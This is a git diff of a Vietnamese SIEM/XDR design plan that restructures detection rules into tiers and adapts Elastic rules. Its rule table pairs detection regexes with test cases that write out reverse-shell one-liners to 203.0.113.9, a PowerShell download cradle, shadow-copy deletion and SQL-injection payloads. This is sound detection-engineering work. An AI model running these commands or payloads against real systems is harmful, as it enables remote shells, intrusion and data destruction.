@@ -11,13 +11,14 @@ Nhờ vậy cách lách nhỏ chỉ đẩy phát hiện xuống bậc thấp hơ
 
 **Architecture:**
 - Không thêm trường YAML: họ rule suy từ mã (`WIN-005-L`, `WIN-005`, `WIN-005-H`), bậc suy từ `severity`.
-- Lint (`detection/lint.py`) kiểm ràng buộc họ, tính bao hàm (bậc trên ⊆ bậc dưới, kiểm bằng ca test) và quy định chỉ bậc cao được phản ứng tự động.
+- Lint (`detection/lint.py`) kiểm ràng buộc họ, tính bao hàm (bậc trên ⊆ bậc dưới, kiểm bằng ca test), quy định chỉ bậc cao được phản ứng tự động, và kiểm trường nhóm theo nguồn log.
+- Parser thêm `process.args` để rule khớp theo từng tham số như Elastic, không phụ thuộc thứ tự hay dấu ngoặc kép.
 - RBA đã sửa ở commit `0208bc9`: một event tính một lần, một rule tính một lần.
 - Console, KPI và benchmark tách alert low ra khỏi phần việc của analyst.
 
 **Tech Stack:** Python 3.14 (server/.venv), pytest, YAML rule engine riêng (`detection/rules.py`), bộ biên dịch Sigma (`ai/sigma.py`), console HTML thuần.
 
-**Spec:** mục *Thiết kế* ngay dưới đây. Bản thiết kế chốt qua trao đổi 21–22/10/2026; số liệu đánh giá rule nằm trong memory `siem-xdr-rule-review-2026-10-21`.
+**Spec:** mục *Thiết kế* ngay dưới đây. Bản thiết kế chốt qua trao đổi 21–22/10/2026, có tham khảo `elastic/detection-rules` tại commit `9431b803cd7bf18e79bc5f703534ba4a1e4eb729` (mục *Học từ Elastic*). Số liệu đánh giá rule nằm trong memory `siem-xdr-rule-review-2026-10-21`.
 
 ## Global Constraints
 
@@ -26,33 +27,39 @@ Nhờ vậy cách lách nhỏ chỉ đẩy phát hiện xuống bậc thấp hơ
   - nhánh `worktree-rba-dedupe-tiering` (commit `0208bc9`) đã gộp vào;
   - làm trên nhánh mới `feature/rule-tiers` tách từ hai nhánh trên.
 - **Lịch** (theo `ROADMAP.md`):
-  - Task 1–12 trước **09/11/2026** (đóng băng tính năng);
-  - Task 13 (đo, hiệu chỉnh, tài liệu) từ 09/11 đến 12/11, giai đoạn này chỉ sửa lỗi;
-  - Task 10–12 trùng với tuần 3 của ROADMAP; nếu trễ thì dời sau v1.0 và giữ nguyên Task 1–9.
+  - Task 1–13 trước **09/11/2026** (đóng băng tính năng);
+  - Task 14 (đo, hiệu chỉnh, tài liệu) từ 09/11 đến 12/11, giai đoạn này chỉ sửa lỗi;
+  - Task 15 làm sau v1.0;
+  - Task 11–13 trùng với tuần 3 của ROADMAP; nếu trễ thì dời sau v1.0 và giữ nguyên Task 1–10.
 - **Hậu tố mã rule:**
   - chỉ có `-L` và `-H`;
   - `-L` bắt buộc là `low`; `-H` bắt buộc là `high` hoặc `critical`;
   - trong một họ, mức độ tăng chặt theo thứ tự L < gốc < H theo `SEVERITY_SCORE`;
   - các rule trong họ phải cùng `logsource` và cùng `type`;
   - có `-L` hoặc `-H` thì phải có rule gốc.
-- **Rule `-L` mới** bắt đầu ở `mode: shadow` với `shadow_since` là ngày commit. Rule sinh ra do tách rule đang chạy chính thức (WIN-014, WIN-015) và mọi thay đổi `severity` của rule có sẵn thì có hiệu lực ngay.
-- **Rule low dạng `match`** phải có `suppress: 3600` và `group_by` là trường mà nguồn log luôn có:
-  - tiến trình, service, FIM: `[agent.id]`;
-  - web, mạng: `[source.ip]`;
-  - AUTH-004: `[source.ip]`; AUTH-005: `[user.name]`.
+- **Rule mới** bắt đầu ở `mode: shadow` với `shadow_since` là ngày commit. Rule sinh ra do tách rule đang chạy chính thức (WIN-014, WIN-015, WEB-001-H) và mọi thay đổi `severity` của rule có sẵn thì có hiệu lực ngay.
+- **Rule low dạng `match`** phải có `suppress: 3600` và `group_by` lấy từ bảng `GROUP_FIELDS` của lint (Task 2):
+  - `process_creation`, `process_access`, `file_integrity`, `security`, `system`: `agent.id`;
+  - `webserver`, `network_connection`, `ids`: `source.ip`;
+  - `auth`: `source.ip` hoặc `user.name`.
 - **Không sửa tay `condition` của rule SigmaHQ** (header của `lo-01.yml`). Chỉ được đổi `severity`, `suppress`, `group_by`, `mode`.
 - **Phản ứng tự động** (`block_ip`, `kill_process`, `isolate_host`, kể cả loại cần duyệt) chỉ được gắn với rule có `severity` từ high trở lên và không có rule `-H` cùng họ.
 - **Loại trừ:** điều kiện loại trừ (`not`, `exceptions`, danh sách cho phép) chỉ được đặt ở rule có bậc `-L` không loại trừ nằm bên dưới. Đây là nguyên tắc viết rule, không do lint kiểm.
+- **Phần phỏng theo Elastic** (Elastic License 2.0):
+  - có comment `# phỏng theo Elastic "<tên rule>" (Elastic License 2.0)`;
+  - khóa `references` trỏ tới permalink `https://github.com/elastic/detection-rules/blob/9431b803cd7bf18e79bc5f703534ba4a1e4eb729/<đường dẫn>`;
+  - không chép nguyên file TOML hay investigation guide;
+  - `RULES.md` thêm một dòng nguồn và giấy phép.
 - Mỗi rule giữ đủ metadata bắt buộc (`RULES.md` mục 2.11), có ít nhất 1 ca dương và 1 ca âm, và qua `tools/rule_lint.py`.
 - **Chạy test:** `cd server && D:/GSANM/BTL/siem-xdr/server/.venv/Scripts/python.exe -m pytest -q`. Venv chỉ có ở checkout chính nhưng dùng được từ mọi worktree. Lint: `python ../tools/rule_lint.py`, chạy bằng cùng python đó. Đường nền: `test_ai.py::test_approved_ai_rule_runs_in_shadow_then_promoted` đang fail sẵn vì phụ thuộc ngày chạy (`shadow_since` 13/10 nay đã quá 7 ngày); không tính lỗi này cho task nào.
 
 ## Review Focus
 
-1. **Rule low có `group_by` mà event thật thiếu trường đó sẽ không bao giờ bắn, và không báo lỗi gì** (`RuleEngine._group` trả `None`). Ca test viết tay có thể đủ trường trong khi event qua parser thì không. Task 7 và Task 8 có test cho event đi qua parser thật.
-2. **Alert low làm phồng KPI và danh sách "Đang mở".** Alert low không bao giờ được đóng nên chỉ số alert mỗi ca trực, MTTD và tỉ lệ làm giàu dữ liệu sẽ lệch. Task 5 có test.
-3. **E2E tìm alert theo `startswith`**, nên `alert(admin, "WEB-001")` có thể nhận `WEB-001-L`, cho kết quả đạt giả hoặc fail giả. Task 5 sửa helper thành so khớp đúng mã.
+1. **Rule low có `group_by` mà event thật thiếu trường đó sẽ không bao giờ bắn, và không báo lỗi gì** (`RuleEngine._group` trả `None`). Ca test viết tay có thể đủ trường trong khi event qua parser thì không. Có test ở Task 2 (bảng `GROUP_FIELDS`), Task 8 và Task 9 (event qua parser thật).
+2. **Alert low làm phồng KPI và danh sách "Đang mở".** Alert low không bao giờ được đóng nên chỉ số alert mỗi ca trực, MTTD và tỉ lệ làm giàu dữ liệu sẽ lệch. Task 6 có test.
+3. **E2E tìm alert theo `startswith`**, nên `alert(admin, "WEB-001")` có thể nhận `WEB-001-L` hoặc `WEB-001-H`, cho kết quả đạt giả hoặc fail giả. Task 6 sửa helper thành so khớp đúng mã.
 4. **Wildcard trong playbook gắn nhầm bậc thấp vào phản ứng tự động** (vd ai đó thêm `LNX-*` vào playbook diệt tiến trình). Task 3 có test lint.
-5. **`windash` với giá trị có hơn 3 dấu gạch** làm số biến thể bùng nổ, hoặc bị bỏ qua mà không báo. Task 4 có test: tối đa 3 vị trí, nhiều hơn thì báo `SigmaError`.
+5. **Tách tham số Windows sai** (ngoặc kép lẻ, `\"`, đường dẫn có dấu cách) làm rule dùng `process.args` bỏ sót mà không báo. Task 5 có test theo quy tắc của `CommandLineToArgvW`.
 
 ---
 
@@ -62,7 +69,7 @@ Nhờ vậy cách lách nhỏ chỉ đẩy phát hiện xuống bậc thấp hơ
 
 | Bậc | `severity` | Viết thế nào | SOAR | Tiêu chí bật chính thức (đo trên log lab ≥ 7 ngày, việc 1.4) |
 |---|---|---|---|---|
-| `-L` tín hiệu | low | hành vi kẻ tấn công thật sự dùng, rộng, **không loại trừ** | chỉ cộng RBA, không mở case, không thông báo, ẩn khỏi danh sách mặc định | trung bình ≤ 5 alert/ngày/máy |
+| `-L` tín hiệu (= *building block* của Elastic) | low | hành vi kẻ tấn công thật sự dùng, rộng, **không loại trừ** | chỉ cộng RBA, không mở case, không thông báo, ẩn khỏi danh sách mặc định | trung bình ≤ 5 alert/ngày/máy |
 | gốc | medium hoặc high (critical nếu không có `-H`) | rule hiện tại, sửa lỗi; được loại trừ khi có `-L` bên dưới | mở case (medium); thông báo (high) | < 5 alert/ngày và báo nhầm < 30% (tiêu chí chạy bóng hiện có) |
 | `-H` chắc chắn | high hoặc critical | hẹp, gần như không báo nhầm | được phản ứng tự động | 0 báo nhầm trên mọi tập bình thường |
 
@@ -70,62 +77,94 @@ Hai mẫu viết bảo đảm bao hàm:
 - `-L` = `any: [<điều kiện gốc không có phần loại trừ>, <phần mở rộng>]`;
 - gốc = `all: [<điều kiện -L>, not: <loại trừ>]`.
 
+### Học từ Elastic
+
+Số liệu từ 2.297 rule đang dùng, đọc ngày 22/10/2026.
+
+**Áp dụng:**
+- **Khớp theo `process.args`** (507 rule, so với 206 rule dùng `process.command_line`; chỉ 35 rule dùng regex). Mỗi tham số là một phần tử mảng, nên không phụ thuộc thứ tự hay dấu ngoặc kép. Cờ viết theo kiểu `?urlcache`, tương đương regex `^[-/\u2013\u2014\u2015]urlcache$` của mình. → Task 5, và các dòng WIN-007, WIN-010, WIN-012 trong bảng.
+- **Nhận diện chương trình bằng `process.name` hoặc `process.pe.original_file_name`**, để chương trình bị đổi tên vẫn bị nhận ra. Ở repo này, trường tương ứng là `winlog.event_data.OriginalFileName`.
+- **Building block:** 131 rule, tất cả mức low và `risk_score` 21, ẩn khỏi danh sách alert. Đúng với bậc `-L`. Elastic còn có 607 rule low hiển thị bình thường.
+- **Test `test_group_field_in_schemas`:** trường nhóm phải có trong schema của nguồn log. → Bảng `GROUP_FIELDS` ở Task 2.
+- **Rule bắt payload SQLi cụ thể ở mức high**, còn bắt rộng thì để low. → Tách `WEB-001-H`. Đã chạy thử trên CSIC 2010: 0 báo nhầm trên tập bình thường, bắt 552/810 mẫu mà WEB-001 bắt, bắt được payload SQLi của e2e.
+- **Truy cập LSASS:** Elastic loại theo quyền truy cập vô hại, theo tiến trình nguồn và theo CallTrace, thay vì liệt kê quyền độc hại. → WIN-015.
+- **Danh sách tiến trình con của Office** (khoảng 60 chương trình, mức medium) → WIN-008-L. **Danh sách đường dẫn duy trì truy cập trong FIM** (mức low) → FIM-001-L.
+- **Rule chống làm rối bằng ký tự Unicode** ("Command Obfuscation via Unicode Modifier Letters", mức high) → WIN-016.
+- **Mẫu reverse shell Linux** (`setsid`/`nohup` + `/dev/tcp`…`0>&1`, awk `/inet/tcp/`, lua `socket.tcp`, python `import pty` / `subprocess`) → LNX-001.
+- **Rule bậc cao "Alerts in Different ATT&CK Tactics by Host":** cần ≥ 2 rule và ≥ 3 chiến thuật trong 8 giờ, chỉ tính alert có `risk_score > 21`. → Task 15.
+
+**Không áp dụng lúc này:**
+- **Rule `new_terms`** (bắt hành vi lần đầu xuất hiện, 264 rule): engine chưa có kho trạng thái "đã từng thấy"; để sau v1.0.
+- **Chuỗi sự kiện EQL theo `process.entity_id`** (tiến trình bắt đầu rồi chính nó mở kết nối mạng, cách bắt reverse shell theo hành vi): Linux chưa có telemetry mạng theo tiến trình; cần auditd `connect` trước (`RULES.md` việc 2.6).
+- **Thư mục riêng cho building block:** giữ `-L` cạnh rule gốc trong cùng file, để duyệt và kiểm bao hàm theo họ cho dễ.
+- **Investigation guide:** đã có case playbook theo rule (`PLAYBOOKS.md`).
+- **`risk_score` riêng:** đã có severity × 25 × hệ số tài sản, tương đương.
+
 ### Bảng họ rule
 
 Ghi chú cho bảng:
 - "→" là thay đổi so với hiện tại.
-- Regex viết theo cú pháp Python, chưa escape theo YAML.
-- Các ca có dấu ✓ đã chạy thử qua engine thật ngày 22/10 (`proto_tiers.py`, 23/23 ca đúng, không regex nào bị cờ ReDoS, regex dài nhất 147 ký tự).
+- Regex viết theo cú pháp Python, chưa escape theo YAML. `PS` = `any`[`process.name in [powershell.exe, pwsh.exe]`, `winlog.event_data.OriginalFileName in [PowerShell.EXE, pwsh.dll]`].
+- Các ca có dấu ✓ đã chạy thử qua engine thật ngày 22/10 (23/23 ca đúng, không regex nào bị cờ ReDoS, regex dài nhất 147 ký tự).
 
 | Họ | Sau tái cấu trúc | Điều kiện | Ca test thêm (dương / âm) |
 |---|---|---|---|
-| WIN-005 | `WIN-005-L` low, shadow | `all`: `event.category = process`; `any`[`process.name in [powershell.exe, pwsh.exe]`, `winlog.event_data.OriginalFileName in [PowerShell.EXE, pwsh.dll]`]; `process.command_line` regex `(^\|\s)[-/\u2013\u2014\u2015]e(c\|n[a-z]*)?\s+["']?[A-Za-z0-9+/=]{20,}` | dương ✓: `-ec`, `/enc`, `–EncodedCommand "…"`, lớp vỏ Ansible, `p.exe` có `OriginalFileName` = PowerShell.EXE. Âm ✓: `-ex bypass -c Get-Process` |
+| WIN-005 | `WIN-005-L` low | `all`: `event.category = process`; `PS`; `process.command_line` regex `(^\|\s)[-/\u2013\u2014\u2015]e(c\|n[a-z]*)?\s+["']?[A-Za-z0-9+/=]{20,}` | dương ✓: `-ec`, `/enc`, `–EncodedCommand "…"`, lớp vỏ Ansible, `p.exe` có `OriginalFileName` = PowerShell.EXE. Âm ✓: `-ex bypass -c Get-Process` |
 | | `WIN-005` high → **medium** | điều kiện `-L` + giữ 2 vế `not` loại Ansible | dương: `-ec`, `/enc`, `–enc`. Âm: lớp vỏ Ansible (giữ test `test_pipeline.py:218`) |
-| WIN-006 | `WIN-006-L` low, shadow | process_creation, PowerShell (như WIN-005) + regex `downloadstring\|downloadfile\|downloaddata\|invoke-webrequest\|\biwr\b\|invoke-restmethod\|\birm\b\|net\.webclient\|start-bitstransfer` | dương: lệnh cài Chocolatey. Âm: `powershell -c Get-Date` |
+| WIN-006 | `WIN-006-L` low | process_creation, `PS` + regex `downloadstring\|downloadfile\|downloaddata\|invoke-webrequest\|\biwr\b\|invoke-restmethod\|\birm\b\|net\.webclient\|start-bitstransfer` | dương: lệnh cài Chocolatey. Âm: `powershell -c Get-Date` |
 | | `WIN-006` critical → **medium**, `logsource` → process_creation | điều kiện `-L` + `any`[`\b(iex\|invoke-expression)\b`, `[-/\u2013\u2014\u2015]w(indowstyle)?\s+h(idden)?`, `executionpolicy\s+bypass\|[-/]ep?\s+bypass`] + `not` regex `https://community\.chocolatey\.org/install\.ps1` | dương: `-w hidden -nop -c "iex(iwr http://203.0.113.9/a)"`, đảo thứ tự `-nop -w hidden`. Âm: lệnh cài Chocolatey |
-| | **`WIN-014`** critical, active (mới, tách từ WIN-006) | logsource `ps_script`; `powershell.script_block` regex [`invoke-mimikatz`, `amsiutils\|amsiinitfailed`, `invoke-shellcode`, `frombase64string\(.*\)\s*\|\s*iex`] | dương: 4104 có `Invoke-Mimikatz`. Âm: 4104 có `DownloadString('https://community.chocolatey.org/install.ps1')` |
-| WIN-007 | `WIN-007-L` low, shadow | `any`[điều kiện gốc, `process.command_line` regex [`\bprocdump(64)?(\.exe)?["']?\s.*[-/]ma\b`, `\bminidump`]] | dương: `procdump.exe -accepteula -ma 672 out.dmp`. Âm: `procdump -h` |
+| | **`WIN-014`** critical (mới, tách từ WIN-006, active) | logsource `ps_script`; `powershell.script_block` regex [`invoke-mimikatz`, `amsiutils\|amsiinitfailed`, `invoke-shellcode`, `frombase64string\(.*\)\s*\|\s*iex`] | dương: 4104 có `Invoke-Mimikatz`. Âm: 4104 có `DownloadString('https://community.chocolatey.org/install.ps1')` |
+| WIN-007 | `WIN-007-L` low | `any`[gốc, `all`[`process.name in [procdump.exe, procdump64.exe]`, `process.args` regex `^[-/\u2013\u2014\u2015]m[ap]$`], `process.command_line` regex `\bminidump`] | dương: `procdump.exe -accepteula -ma 672 out.dmp`. Âm: `procdump -h` |
 | | `WIN-007` critical, giữ playbook diệt tiến trình | bỏ nhánh `process_access`; giữ regex dòng lệnh và `process.name = mimikatz.exe` | giữ ca cũ |
-| | **`WIN-015`** medium, active (mới, tách từ WIN-007) | logsource `process_access`; nhánh `process_access` cũ của WIN-007; không phản ứng tự động | dương: GrantedAccess `0x1410` vào lsass. Âm: `0x1000` |
+| | **`WIN-015`** medium (mới, tách từ WIN-007, active) | phỏng theo Elastic "Suspicious Lsass Process Access"; logsource `process_access`; `process.target.name = lsass.exe`; `not process.target.granted_access in [0x1000, 0x1400, 0x101400, 0x101000, 0x101001, 0x100000, 0x100040, 0x3200, 0x40]`; `not winlog.event_data.SourceImage` regex `^[a-z]:\\(program files( \(x86\))?\\\|programdata\\microsoft\\windows defender\\platform\\\|windows\\system32\\(csrss\|wininit\|lsm\|mrt\|msiexec)\.exe$\|windows\\(system32\|syswow64)\\wbem\\wmiprvse\.exe$\|windows\\sysmon(64)?\.exe$)`; `not winlog.event_data.CallTrace` regex `mpengine\.dll\|appresolver\.dll\|sysmain\.dll` | dương: `0x1410` từ `C:\Users\Public\x.exe`. Âm: `0x1410` từ `C:\Program Files\AV\av.exe`; `0x1000` |
 | WIN-008 | `WIN-008` high | tiến trình cha thêm `onenote.exe`; tiến trình con thêm `msbuild.exe`, `certutil.exe`, `bitsadmin.exe`, `schtasks.exe`, `hh.exe` | dương: onenote.exe → cmd.exe |
-| WIN-009 | `WIN-009-L` low, shadow | `event.action = service_installed` | dương: service bất kỳ. Âm: event 7036 |
-| WIN-010 | `WIN-010` critical | regex [`vssadmin(\.exe)?["']?\s+(delete\s+shadows\|resize\s+shadowstorage)`, `wmic(\.exe)?["']?\s+shadowcopy\s+delete`, `win32_shadowcopy.*(\.delete\(\|remove-)`, `bcdedit(\.exe)?["']?.*recoveryenabled\s+no`, `wbadmin(\.exe)?["']?\s+delete\s+(catalog\|systemstatebackup)`] | dương: đường dẫn trong ngoặc kép, `resize shadowstorage`, WMI qua PowerShell |
-| | `WIN-010-L` low, shadow | `any`[gốc, regex `\b(vssadmin\|wbadmin\|bcdedit\|diskshadow)(\.exe)?\b\|win32_shadowcopy`] | dương: `vssadmin list shadows`. Âm: `notepad.exe` |
-| WIN-012 | `WIN-012` high → **medium** | regex chấp nhận windash và ngoặc kép: [`certutil(\.exe)?["']?.*[-/]urlcache.*(http\|ftp)`, `certutil(\.exe)?["']?.*[-/]decode`, `mshta(\.exe)?["']?\s+["']?(http\|javascript\|vbscript)`, `regsvr32(\.exe)?["']?.*[-/]i:(http\|ftp)`, `rundll32(\.exe)?["']?.*javascript:`, `bitsadmin(\.exe)?["']?.*[-/]transfer`] | dương: `certutil /urlcache …`, `"mshta.exe" "http://…"`. Âm: `certutil -hashfile a.exe SHA256` |
-| | `WIN-012-L` low, shadow | `any`[gốc, `all`[`process.name in [certutil.exe, mshta.exe, regsvr32.exe, bitsadmin.exe]`, regex `(https?\|ftp)://`]] | dương: `certutil -verifyctl -f http://…`. Âm: như gốc |
-| WIN-013 | `WIN-013-L` low, shadow | `any`[gốc, `all`[`process.name = schtasks.exe`, regex `[-/]create`]] | dương: tác vụ sao lưu `C:\Scripts\backup.cmd` (gốc im) |
+| | `WIN-008-L` low (mới) | phỏng theo Elastic "Suspicious MS Office Child Process": `any`[gốc, `all`[tiến trình cha `in` danh sách của Elastic + `onenote.exe`, tiến trình con `in` toàn bộ danh sách của Elastic, `not` vế outlook → rundll32 `srchadmin.dll` của Elastic]] | dương: winword.exe → whoami.exe. Âm: winword.exe → splwow64.exe |
+| WIN-009 | `WIN-009-L` low | `event.action = service_installed` | dương: service bất kỳ. Âm: event 7036 |
+| WIN-010 | `WIN-010` critical, viết lại theo `process.args` (phỏng theo 2 rule Elastic về Volume Shadow Copy) | `any` của các vế: [vssadmin: `any`[`process.name = vssadmin.exe`, `OriginalFileName = VSSADMIN.EXE`] ∧ `process.args` regex `^(delete\|resize)$` ∧ `process.args` regex `^shadows`]; [wmic: `process.name = wmic.exe` ∧ `process.args` regex `^shadowcopy$` ∧ `process.args` regex `^delete$`]; [PowerShell: `PS` ∧ `process.command_line` regex `get-wmiobject\|gwmi\|get-ciminstance\|gcim` ∧ `win32_shadowcopy` ∧ `\.delete\(\)\|remove-wmiobject\|rwmi\|remove-ciminstance\|rcim`]; [`process.command_line` regex `bcdedit(\.exe)?["']?.*recoveryenabled\s+no`, `wbadmin(\.exe)?["']?\s+delete\s+(catalog\|systemstatebackup)`] | dương: `"C:\Windows\System32\vssadmin.exe" delete shadows /all`, `vssadmin resize shadowstorage /maxsize=401MB`, `shadows /all delete` đảo thứ tự, WMI qua PowerShell |
+| | `WIN-010-L` low | `any`[gốc, regex `\b(vssadmin\|wbadmin\|bcdedit\|diskshadow)(\.exe)?\b\|win32_shadowcopy`] | dương: `vssadmin list shadows`. Âm: `notepad.exe` |
+| WIN-012 | `WIN-012` high → **medium** | `any`[phỏng theo Elastic "Suspicious CertUtil Commands": `any`[`process.name = certutil.exe`, `OriginalFileName = CertUtil.exe`] ∧ `process.args` regex `^[-/\u2013\u2014\u2015](urlcache\|verifyctl\|decode\|decodehex\|encode\|encodehex\|exportpfx)$`; `process.command_line` regex [`mshta(\.exe)?["']?\s+["']?(http\|javascript\|vbscript)`, `regsvr32(\.exe)?["']?.*[-/]i:(http\|ftp)`, `rundll32(\.exe)?["']?.*javascript:`, `bitsadmin(\.exe)?["']?.*[-/]transfer`]] | dương: `certutil /urlcache …`, `certutil –decode a b`, `"mshta.exe" "http://…"`. Âm: `certutil -hashfile a.exe SHA256` |
+| | `WIN-012-L` low | `any`[gốc, `all`[`process.name in [certutil.exe, mshta.exe, regsvr32.exe, bitsadmin.exe]`, regex `(https?\|ftp)://`]] | dương: `regsvr32 /s http://…/a.sct`. Âm: như gốc |
+| WIN-013 | `WIN-013-L` low | `any`[gốc, `all`[`process.name = schtasks.exe`, `process.args` regex `^[-/]create$`]] | dương: tác vụ sao lưu `C:\Scripts\backup.cmd` (gốc im) |
 | WIN-003 | medium → **low** | giữ điều kiện; thêm `suppress`, `group_by: [agent.id]` | giữ ca cũ, thêm `agent.id` vào event |
 | WIN-004 | `WIN-004` high | `any`[`group.id in [S-1-5-32-544, S-1-5-32-555]`, `group.id` regex `-(512\|518\|519)$`]; bỏ so theo tên | dương: Administratoren (S-1-5-32-544). Âm: Hyper-V Administrators (S-1-5-32-578) |
-| LNX-001 | `LNX-001` critical | sửa vế nc thành `\bnc(at)?\b.*\s-[ec]\s+\S*sh\b`; thêm [`php\s+-r.*fsockopen`, `perl\s+-e.*socket`, `ruby\s+-rsocket`] | dương: `nc 203.0.113.9 4444 -e sh`, `php -r '$sock=fsockopen(…)'` |
-| | `LNX-001-L` low, shadow | `any`[gốc, regex [`/dev/(tcp\|udp)/`, `\b(nc\|ncat\|netcat\|socat)\b`, `fsockopen\|socket\.socket\|TCPSocket`, `\bmkfifo\b`]] | dương: `nc -zv 10.0.0.5 22`. Âm: `ls -la` |
+| — | **`WIN-016`** high (mới, shadow) | phỏng theo Elastic "Command Obfuscation via Unicode Modifier Letters": `any`[`process.name in` danh sách LOLBin của Elastic, `OriginalFileName in` danh sách tương ứng] ∧ `process.command_line` regex `[\u02b0-\u02ff\u1d2c-\u1dbb]` | dương: `certutil -ᵘrlcache -f http://10.0.0.5/a.exe`. Âm: `certutil -urlcache -f http://10.0.0.5/a.exe` (thuộc WIN-012) |
+| LNX-001 | `LNX-001` critical | sửa vế nc thành `\bnc(at)?\b.*\s-[ec]\s+\S*sh\b`; thêm [`php\s+-r.*fsockopen`, `perl\s+-e.*socket`, `ruby\s+-rsocket`, phỏng theo Elastic: `\b(setsid\|nohup)\b.*/dev/tcp/.*0>&1`, `\b[gmn]?awk\b.*/inet/tcp/`, `\blua\S*\s+-e.*socket\.tcp`, `python\S*\s+-c.*import.*(pty.*spawn\|subprocess.*call)`] | dương: `nc 203.0.113.9 4444 -e sh`, `php -r '$sock=fsockopen(…)'`, `nohup bash -c 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1' &`, `gawk 'BEGIN{s="/inet/tcp/0/203.0.113.9/4444"…}'` |
+| | `LNX-001-L` low | `any`[gốc, regex [`/dev/(tcp\|udp)/`, `\b(nc\|ncat\|netcat\|socat)\b`, `fsockopen\|socket\.socket\|TCPSocket\|/inet/tcp/`, `\bmkfifo\b`]] | dương: `nc -zv 10.0.0.5 22`. Âm: `ls -la` |
 | LNX-002 | `LNX-002` critical, giữ playbook diệt tiến trình | tiến trình cha còn [apache2, httpd, nginx, php-fpm, lighttpd] (bỏ `java`, `php`, `tomcat`) | âm: java → `sh -c ./gradlew build`. E2E bước cmdi giữ nguyên |
-| | `LNX-002-L` low, shadow | `any`[gốc, `all`[tiến trình cha `in [java, php, tomcat, node, python3, gunicorn, uwsgi]`, tiến trình con như gốc]] | dương: java → sh |
-| LNX-003 | `LNX-003-L` low, shadow | regex [`\b(curl\|wget)\b[^\|;&]*` + `INTERP`, `` (\$\(\|`\|<\()\s*(curl\|wget)\b ``, `TMP`] với `INTERP` = `\|\s*(sudo\s+)?(\S*/)?((ba\|da\|z\|k)?sh\|python[0-9.]*\|perl\|ruby\|php\|node)\b`, `TMP` = `\b(curl\|wget)\b.*\s(-O\|-o\|--output)\s*\S*(/tmp/\|/dev/shm/).*chmod\s+\S*x` | dương ✓: `get.docker.com.evil.io`, `get.docker.com` chính thức, `\| sudo bash`, `bash -c "$(curl …)"`, `\| python3`. Âm ✓: `curl … \| jq`, `curl -o /tmp/a.tar.gz …` |
+| | `LNX-002-L` low | `any`[gốc, `all`[tiến trình cha `in [java, php, tomcat, node, python3, gunicorn, uwsgi]`, tiến trình con như gốc]] | dương: java → sh |
+| LNX-003 | `LNX-003-L` low | regex [`\b(curl\|wget)\b[^\|;&]*` + `INTERP`, `` (\$\(\|`\|<\()\s*(curl\|wget)\b ``, `TMP`] với `INTERP` = `\|\s*(sudo\s+)?(\S*/)?((ba\|da\|z\|k)?sh\|python[0-9.]*\|perl\|ruby\|php\|node)\b`, `TMP` = `\b(curl\|wget)\b.*\s(-O\|-o\|--output)\s*\S*(/tmp/\|/dev/shm/).*chmod\s+\S*x` | dương ✓: `get.docker.com.evil.io`, `get.docker.com` chính thức, `\| sudo bash`, `bash -c "$(curl …)"`, `\| python3`. Âm ✓: `curl … \| jq`, `curl -o /tmp/a.tar.gz …` |
 | | `LNX-003` high → **medium** | `all`[điều kiện `-L`, `not` regex [`\b(curl\|wget)\s(?:[^\|:]\|:(?!//))*://(get\.docker\.com\|sh\.rustup\.rs\|get\.k3s\.io\|install\.python-poetry\.org\|deb\.nodesource\.com)(?=[/:'"\s\|]\|$)`, `\b(curl\|wget)\s(?:[^\|:]\|:(?!//))*://raw\.githubusercontent\.com/(nvm-sh/nvm\|homebrew/install\|ohmyzsh/ohmyzsh\|helm/helm)/`]]. Danh sách cho phép chỉ xét URL đầu tiên sau curl/wget và neo hết tên miền | dương ✓: `get.docker.com.evil.io`, `?r=://get.docker.com`, `\| sudo bash`, `$(curl …)`, bài Atomic trên GitHub, `wget -O /tmp/x … && chmod +x`. Âm ✓: docker, nvm, ohmyzsh chính thức |
 | LNX-005 | medium → **low** | giữ (threshold) | giữ ca cũ |
 | LNX-006 | `LNX-006` high → **medium** | giữ | giữ |
-| | `LNX-006-L` low, shadow | `any`[gốc, regex [`authorized_keys`, `\bcrontab\s+(?!-l\b)`, `/etc/cron`, `systemctl\s+enable`, `/etc/systemd/system/`]] | dương: `echo key >> ~/.ssh/authorized_keys`. Âm: `crontab -l` |
-| WEB-001 | `WEB-001-L` low, shadow | `any`[gốc, `url.decoded` regex [`\b(union\|select\|sleep\|benchmark\|waitfor\|xp_cmdshell\|information_schema)\b`, `['"]\s*(or\|and\|;\|--)`]] | dương: `?id=1' or 'a'='a`. Âm: `/index.html` |
-| WEB-003 | `WEB-003-L` low, shadow | `any`[gốc, `url.decoded` regex [`\.\./`, `\.\.\\`, `/etc/`, `\\windows\\`], `url.original` regex `%2e%2e\|%252e`] | dương: `/img?f=../a.png`. Âm: `/a/b.png` |
+| | `LNX-006-L` low | `any`[gốc, regex [`authorized_keys`, `\bcrontab\s+(?!-l\b)`, `/etc/cron`, `systemctl\s+enable`, `/etc/systemd/system/`]] | dương: `echo key >> ~/.ssh/authorized_keys`. Âm: `crontab -l` |
+| WEB-001 | `WEB-001` high → **medium** (không còn chặn IP) | giữ | giữ; e2e `alert(admin, "WEB-001")` vẫn thấy |
+| | **`WEB-001-H`** high (mới, active, nhận playbook chặn IP qua `WEB-*`) | phỏng theo Elastic "Web Server Potential SQL Injection Request": `url.decoded` regex [`union(?:\s\|\+\|/\*(?:(?!\*/).)*\*/)+(?:all\s+)?select\s+(null\b\|[^&]{1,200}?\sfrom\s)`, `\b(sleep\|pg_sleep)\s*\(\s*\d`, `\bbenchmark\s*\(\s*\d+\s*,`, `waitfor\s+delay\s+'`, `dbms_pipe\.receive_message\|dbms_lock\.sleep`, `['"]\s*or\s+['"]?(1['"]?\s*=\s*['"]?1\|a['"]\s*=\s*['"]a)`, `\band\s+1\s*=\s*[12]\s*--`, `\b(extractvalue\|updatexml)\s*\(.{0,100}?concat\s*\(\s*0x`, `\bload_file\s*\(\|\binto\s+(out\|dump)file\b`, `information_schema\.(tables\|columns)\|@@version\|\bxp_(cmdshell\|dirtree)\b`]. Đã chạy thử ✓: 0 báo nhầm CSIC, bắt 552/810 | dương ✓: payload e2e `id=1 union select username,password from users`. Âm: `?q=union+station` |
+| | `WEB-001-L` low | `any`[gốc, `url.decoded` regex [`\b(union\|select\|sleep\|benchmark\|waitfor\|xp_cmdshell\|information_schema)\b`, `['"]\s*(or\|and\|;\|--)`]] | dương: `?id=1' or 'a'='a`. Âm: `/index.html` |
